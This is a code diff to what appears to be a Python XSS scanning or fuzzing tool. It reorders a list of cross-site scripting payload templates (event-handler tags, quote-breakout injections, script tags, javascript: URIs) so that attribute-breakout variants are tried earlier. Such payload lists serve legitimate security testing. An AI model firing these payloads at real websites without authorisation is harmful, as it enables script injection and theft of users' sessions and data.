@@ -50,12 +50,21 @@ def _marker_encodings(marker: str = "XSS") -> List[str]:
 # Slash-separated variants beat space blacklists; <image> covers filters that
 # strip every tag except <image> (browsers treat it as <img>).
 _CONTEXTS: List[Tuple[str, str]] = [
+    # Body-context AND attribute-breakout interleaved near the front: reflection
+    # may land in the page body OR inside value="..." — breakouts (">…) must be
+    # reached within the attempt budget, not buried at the end.
     ("input-autofocus-onfocus", "<input autofocus onfocus={c}>"),
-    ("input-autofocus-onfocus-slash", "<input/autofocus/onfocus={c}>"),
-    ("details-ontoggle", "<details open ontoggle={c}>x</details>"),
-    ("details-ontoggle-slash", "<details/open/ontoggle={c}>x</details>"),
-    ("body-onload", "<body onload={c}>"),
+    ("dq-break-input", "\"><input autofocus onfocus={c}>"),
+    ("sq-break-input", "'><input autofocus onfocus={c}>"),
     ("svg-onload", "<svg onload={c}>"),
+    ("dq-break-svg", "\"><svg onload={c}>"),
+    ("body-onload", "<body onload={c}>"),
+    ("dq-break-img", "\"><img src=x onerror={c}>"),
+    ("sq-break-img", "'><img src=x onerror={c}>"),
+    ("details-ontoggle", "<details open ontoggle={c}>x</details>"),
+    ("input-autofocus-onfocus-slash", "<input/autofocus/onfocus={c}>"),
+    ("dq-break-input-slash", "\"><input/autofocus/onfocus={c}>"),
+    ("details-ontoggle-slash", "<details/open/ontoggle={c}>x</details>"),
     ("svg-onload-slash", "<svg/onload={c}>"),
     ("select-autofocus-onfocus", "<select autofocus onfocus={c}><option>a</option></select>"),
     ("textarea-autofocus-onfocus", "<textarea autofocus onfocus={c}></textarea>"),
@@ -65,8 +74,6 @@ _CONTEXTS: List[Tuple[str, str]] = [
     ("marquee-onstart", "<marquee onstart={c}>x</marquee>"),
     ("iframe-srcdoc", "<iframe srcdoc=\"&lt;script&gt;{c}&lt;/script&gt;\"></iframe>"),
     ("script-tag", "<script>{c}</script>"),
-    ("attr-breakout-dq", "\"><img src=x onerror={c}>"),
-    ("attr-breakout-sq", "'><img src=x onerror={c}>"),
     ("js-uri", "javascript:{c}"),
 ]
 
